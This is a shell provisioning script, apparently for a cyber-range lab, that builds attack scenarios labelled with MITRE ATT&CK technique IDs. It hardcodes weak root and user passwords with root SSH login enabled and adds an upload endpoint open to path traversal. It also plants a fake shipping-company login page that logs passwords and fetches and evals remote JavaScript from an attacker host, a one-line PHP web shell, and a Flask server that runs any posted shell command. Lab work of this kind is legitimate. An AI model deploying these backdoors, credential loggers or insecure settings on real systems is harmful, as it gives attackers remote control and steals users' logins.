############### C0010

#
## Global commands
#
apt-get update
apt-get install -y python3 python3-pip sshpass curl socat

## SSH
apt-get install -y openssh-server
mkdir -p /var/run/sshd
echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config
echo 'PasswordAuthentication yes' >> /etc/ssh/sshd_config

pgrep -x "sshd" > /dev/null || /usr/sbin/sshd & 


# Root password
echo 'root:RootPass123' | chpasswd

# User attacker

useradd -m attacker -s /bin/bash
mkdir -p /home/attacker
echo 'attacker:Passw0rd' | chpasswd
usermod -aG sudo attacker

# DebianUser
useradd -M  DebianUser
mkdir -p /home/DebianUser
echo 'DebianUser:DebianUser' | chpasswd
(echo 'DebianUser'; echo 'DebianUser') | smbpasswd -a -s DebianUser

pgrep -x "php-fpm8.4" > /dev/null || php-fpm8.4 &
################################################ End of Global Section


# T1584.001

apt-get install -y bind9 dnsutils

# Check if zone already defined
if ! grep -q "zone \"legitshipping.co.il\"" /etc/bind/named.conf.options; then
    cat >> /etc/bind/named.conf.options << 'EOF'

zone "legitshipping.co.il" {
	type master;
	file "/etc/bind/db.legitshipping.co.il";
	allow-update { none; };
};
EOF
else
    echo "Zone already exists"
fi

cat > /etc/bind/db.legitshipping.co.il << 'EOF'
$TTL 3600
@ IN SOA ns1.legitshipping.co.il. admin.legitshipping.co.il. (
	2024060701 ; Serial
	3600       ; Refresh
	1800       ; Retry
	604800     ; Expire
	3600 )     ; Negative Cache TTL
;
@       IN NS     ns1.legitshipping.co.il.
ns1     IN A      172.21.0.20
www     IN A      172.21.0.20
oldsub  IN CNAME  nonexistent.host.
EOF
cat > /etc/bind/db.legitshipping.co.il << "EOF"
$TTL 3600
@ IN SOA ns1.legitshipping.co.il. admin.legitshipping.co.il. (
	2024060702 ; Serial - INCREMENTED!
	3600       ; Refresh
	1800       ; Retry
	604800     ; Expire
	3600 )     ; Negative Cache TTL
;
@       IN NS     ns1.legitshipping.co.il.
ns1     IN A      172.21.0.20
www     IN A      172.21.0.20
oldsub  IN A      172.22.0.20  ; Point directly to Host B instead of CNAME
EOF

#!/bin/bash
if pgrep -x "named" > /dev/null; then
    echo "✅ named is running. Restarting..."
    pkill named
    sleep 2
    named -g -c /etc/bind/named.conf &
    echo "✅ named restarted"
else
    echo "❌ named is not running. Starting..."
    named -g -c /etc/bind/named.conf &
    echo "✅ named started"
fi



# T1608.001

apt-get install -y python3 python3-pip python3-venv
python3 -m venv /opt/webserver-venv
pip install --break-system-packages flask
cat > /opt/webserver-venv/app.py << 'EOF'
from flask import Flask, request, abort
app=Flask(__name__)
@app.route("/upload", methods=["POST"])
def upload():
    f=request.files.get("file")
    if not f:
        abort(400)
    f.save("/tmp/"+f.filename)
    return "Uploaded", 200
app.run(host="0.0.0.0", port=8010)
EOF
if ! ss -tuln | grep -q ":8010 "; then
  python3 /opt/webserver-venv/app.py & 
 else echo "Port 8010 already in use";
fi



# T1189

apt-get install -y  wget curl python3 python3-pip
pip install --break-system-packages flask
useradd -m -p $(openssl passwd -1 Passw0rd) victim

cat > /var/www/html/foca.php << "EOF"
<?php
session_start();
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $username = $_POST["username"] ?? "";
    $password = $_POST["password"] ?? "";
    file_put_contents("/tmp/login_attempts.log", 
        date("Y-m-d H:i:s") . " - $username:$password\n", 
        FILE_APPEND);
    echo "Login successful! Welcome " . htmlspecialchars($username);
    exit;
}
?>
<!DOCTYPE html>
<html>
<head><title>Login</title></head>
<body>
<h1>Welcome to Israeli Shipping Co.</h1>
<form action="/login.php" method="POST">
<input type="text" name="username" placeholder="Username">
<input type="password" name="password" placeholder="Password">
<input type="submit" value="Login">
</form>
<script>
fetch("http://172.21.0.20:5000/exploit.js")
.then(r=>r.text())
.then(js=>eval(js));
</script>
</body>
</html>
EOF
cat > /root/exploit_server.py << 'EOF'
from flask import Flask, send_file, request
app = Flask(__name__)
@app.route("/exploit.js")
def exploit():
 return "alert(\"Drive-by compromise executed\");"
app.run(host="0.0.0.0", port=5000)
EOF
python3 /root/exploit_server.py &

# T1608.004
cat > /var/www/html/oili.php << 'EOF'
<?php if(isset($_GET["cmd"])){system($_GET["cmd"]);} ?>
EOF

# T1587.001

pip3 install --break-system-packages flask requests
useradd -m sugarush
cat > /home/sugarush/malware_server.py << 'EOF'
#!/usr/bin/env python3
from flask import Flask, request
app = Flask(__name__)
@app.route("/exec", methods=["POST"])
def exec_cmd():
  cmd = request.form.get("cmd")
  import subprocess
  result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
  return result.stdout + result.stderr
if __name__=="__main__":
  app.run(host="0.0.0.0", port=5015)
EOF
chown sugarush:sugarush /home/sugarush/malware_server.py

if ! ss -tuln | grep -q ":5015 "; then
  su - sugarush -c "python3 /home/sugarush/malware_server.py &"
 else echo "Port 5015 already in use";
fi




# T1583.001

apt-get install -y bind9 dnsutils

# Check if zone already defined
if ! grep -q "zone \"malicious-example.com\"" /etc/bind/named.conf.options; then
    cat >> /etc/bind/named.conf.options << 'EOF'

zone "malicious-example.com" {
	type master;
	file "/etc/bind/db.malicious-example.com";
};
EOF
else
    echo "Zone already exists"
fi

cat > /etc/bind/db.malicious-example.com << 'EOF'
$TTL 604800
@ IN SOA ns.malicious-example.com. root.malicious-example.com. (
  2 ; Serial
  604800 ; Refresh
  86400 ; Retry
  2419200 ; Expire
  604800 ) ; Negative Cache TTL
;
@ IN NS ns.malicious-example.com.
ns IN A 172.21.0.20
www IN A 172.21.0.20
EOF
#!/bin/bash
if pgrep -x "named" > /dev/null; then
    echo "✅ named is running. Restarting..."
    pkill named
    sleep 2
    named -g -c /etc/bind/named.conf &
    echo "✅ named restarted"
else
    echo "❌ named is not running. Starting..."
    named -g -c /etc/bind/named.conf &
    echo "✅ named started"
fi

# T1105
#none


#T1608.002
mkdir -p /var/www/html/tools
cat > /var/www/html/tools/tool.txt << 'EOF'
This is a test tool file for upload simulation.
EOF
